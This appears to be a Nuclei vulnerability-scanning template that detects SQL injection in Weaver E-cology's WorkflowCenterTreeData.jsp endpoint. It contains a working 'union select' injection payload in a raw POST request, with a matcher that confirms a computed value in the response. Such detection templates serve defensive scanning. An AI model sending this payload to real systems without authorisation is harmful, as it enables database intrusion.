id: weaver_ecology_sql_injection
info:
  name: Weaver E-cology SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects SQL Injection vulnerability in Weaver E-cology WorkflowCenterTreeData.jsp endpoint.
variables:
  r1: "{{rand_int(4000, 9999)}}"
  r2: "{{rand_int(800, 1000)}}"
http:
  - raw:
      - |
        POST /mobile/browser/WorkflowCenterTreeData.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        node=wftype_1132232323231&scope=23332323&formids=1111111111111%0a%0d%0a%0d%0a)))union+select+1024,({{r1}}*{{r2}})+order+by+(((1
    redirects: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "{{to_number(r1)*to_number(r2)}}"
        part: body
